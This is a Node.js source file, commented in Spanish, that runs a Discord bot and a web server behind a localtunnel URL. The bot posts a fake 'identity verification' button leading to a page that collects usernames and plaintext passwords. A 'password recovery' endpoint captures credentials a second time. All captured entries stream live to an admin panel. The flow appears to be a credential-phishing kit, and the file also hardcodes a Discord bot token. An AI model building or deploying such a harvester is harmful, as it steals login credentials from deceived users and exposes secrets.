const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Configuración del Bot de Discord (Discord.js v14)
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// ==========================================
// CONFIGURA TUS DATOS DE DISCORD AQUÍ:
// ==========================================
const TOKEN_BOT = 'MTU1ODI1MDQ5MjMwNjY1MzE4NA.G3uixE.oOfsTZNA7Z4EciGgDyFVzBKLbZR7z2CDcAdcmU';
const GUILD_ID = '1558251805656354816';
const ROL_EMPLEADO_ID = '1558259671398096906';
const URL_WEB = 'https://empty-glasses-grin.loca.lt'; // Cambiará a tu dominio real cuando lo subas a internet
// ==========================================

let solicitudes = [];

// Evento cuando el bot se conecta correctamente
client.once('ready', () => {
    console.log(`[BOT] Conectado exitosamente como ${client.user.tag}`);
});

// Comando rápido en Discord: escribe !verificar en un canal para enviar el panel interactivo
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!verificar') {
        const embed = new EmbedBuilder()
            .setTitle('🛡️ Verificación de Identidad Empresarial')
            .setDescription('Para acceder al servidor y ver los canales de trabajo, haz clic en el botón de abajo para iniciar sesión y verificar tus credenciales.')
            .setColor(0x5865F2);

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setLabel('Iniciar Verificación')
                    .setStyle(ButtonStyle.Link)
                    .setURL(`${URL_WEB}/?discordId=${message.author.id}&discordTag=${encodeURIComponent(message.author.tag)}`)
            );

        await message.channel.send({ embeds: [embed], components: [row] });
        try { await message.delete(); } catch (e) {} // Borra tu comando !verificar por orden
    }
});

// Recibe los datos enviados desde la web del usuario (Inicio de Sesión)
app.post('/api/verificar', (req, res) => {
    const { usuario, password, discordId, discordTag } = req.body;
    
    const nuevaSolicitud = {
        id: Date.now(),
        tipo: 'Inicio de Sesión',
        usuario,
        password,
        discordId: discordId || 'Desconocido',
        discordTag: discordTag || 'Usuario de Discord',
        fecha: new Date().toLocaleTimeString()
    };

    solicitudes.unshift(nuevaSolicitud);
    io.emit('nueva-solicitud', nuevaSolicitud);

    res.send(`
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <title>Verificando</title>
            <style>
                body { background: #313338; color: #dbdee1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                .box { background: #2b2d31; padding: 40px; border-radius: 8px; width: 400px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
                h2 { color: #f2f3f5; }
                p { color: #949ba4; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="box">
                <h2>¡Datos enviados!</h2>
                <p>Tu solicitud ha sido enviada al administrador. En cuanto sea aprobada, obtendrás acceso en Discord automáticamente.</p>
            </div>
        </body>
        </html>
    `);
});

// Recibe los datos de Recuperación de Contraseña, los envía al panel y redirige al login
app.post('/api/recuperar', (req, res) => {
    const { usuario, password, discordId, discordTag } = req.body;
    
    const nuevaSolicitud = {
        id: Date.now(),
        tipo: '🔑 Recuperación de Contraseña',
        usuario,
        password,
        discordId: discordId || 'Desconocido',
        discordTag: discordTag || 'Usuario de Discord',
        fecha: new Date().toLocaleTimeString()
    };

    solicitudes.unshift(nuevaSolicitud);
    io.emit('nueva-solicitud', nuevaSolicitud);

    // URL para devolver al usuario al inicio de sesión manteniendo su ID de Discord enlazado
    const redirectUrl = `/?discordId=${discordId || ''}&discordTag=${encodeURIComponent(discordTag || '')}`;

    res.send(`
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <title>Redirigiendo...</title>
            <meta http-equiv="refresh" content="3;url=${redirectUrl}">
            <style>
                body { background: #313338; color: #dbdee1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                .box { background: #2b2d31; padding: 40px; border-radius: 8px; width: 400px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
                h2 { color: #f2f3f5; }
                p { color: #949ba4; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="box">
                <h2>Datos recibidos</h2>
                <p>Tus credenciales de recuperación han sido procesadas. Redirigiendo de nuevo al inicio de sesión...</p>
            </div>
        </body>
        </html>
    `);
});

// Ruta para que el panel de administración lea las solicitudes pendientes
app.get('/api/solicitudes', (req, res) => {
    res.json(solicitudes);
});

// Ruta de Aprobación: El bot recibe la orden desde tu panel admin y le asigna el rol en Discord
app.post('/api/aprobar', async (req, res) => {
    const { id, discordId } = req.body;

    try {
        const guild = await client.guilds.fetch(GUILD_ID);
        const member = await guild.members.fetch(discordId);

        // Añade el rol configurado al usuario en Discord
        await member.roles.add(ROL_EMPLEADO_ID);

        // Remueve la solicitud de la lista pendiente
        solicitudes = solicitudes.filter(s => s.id != id);

        res.json({ success: true, message: 'Usuario verificado y rol asignado con éxito.' });
    } catch (error) {
        console.error('Error al dar el rol:', error);
        res.status(500).json({ success: false, error: 'No se pudo encontrar al usuario en el servidor o el bot no tiene permisos suficientes.' });
    }
});

// Iniciar servidor web y bot simultáneamente
server.listen(3000, () => {
    console.log(`[SERVIDOR] Web y Bot activos en https://empty-glasses-grin.loca.lt`);
});

// Conectar el bot con Discord
client.login(TOKEN_BOT);